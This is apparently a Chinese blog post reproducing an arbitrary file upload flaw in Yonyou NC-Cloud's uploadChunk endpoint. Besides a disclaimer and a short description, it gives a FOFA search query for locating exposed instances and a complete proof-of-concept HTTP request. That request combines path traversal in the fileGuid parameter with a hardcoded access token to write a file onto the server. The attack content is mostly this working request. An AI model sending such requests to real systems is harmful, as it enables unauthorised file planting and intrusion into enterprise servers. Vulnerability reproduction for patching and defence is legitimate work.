# 原创
：  漏洞复现--用友NC-Cloud uploadChunk 任意文件上传

# 漏洞复现--用友NC-Cloud uploadChunk 任意文件上传

## 免责声明：

**文章中涉及的漏洞均已修复，敏感信息均已做打码处理，文章仅做经验分享用途，切勿当真，未授权的攻击属于非法行为！文章中敏感信息均已做多层打马处理。传播、利用本文章所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任，一旦造成后果请自行负责**

### 一：漏洞描述

NC Cloud是指用友公司推出的大型企业数字化平台。支持公有云、混合云、专属云的灵活部署模式。该产品uploadChunk文件存在任意文件上传漏洞。

### 二：漏洞影响版本

未知

### 三：网络空间测绘查询

fofa：<br/> `app="用友-NC-Cloud"`<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/f2bd01f7fe86ab37f0e316a1e192262d.jpeg"/>

### 四：漏洞复现

POC：

```
POST /ncchr/pm/fb/attachment/uploadChunk?fileGuid=/../../../nccloud/&amp;chunk=1&amp;chunks=1 HTTP/1.1
Host: 127.0.0.1
Content-Type: multipart/form-data; boundary=024ff46f71634a1c9bf8ec5820c26fa9
accessTokenNcc: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyaWQiOiIxIn0.F5qVK-ZZEgu3WjlzIANk2JXwF49K5cBruYMnIOxItOQ
 
--024ff46f71634a1c9bf8ec5820c26fa9
Content-Disposition: form-data; name="file"; filename="test.txt"
 
test
--024ff46f71634a1c9bf8ec5820c26fa9--

```

<img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/b1b21eff63f506dae620ef2b624a39d4.jpeg"/><br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/655558d3e9f31cf5695f915509baff84.jpeg"/>
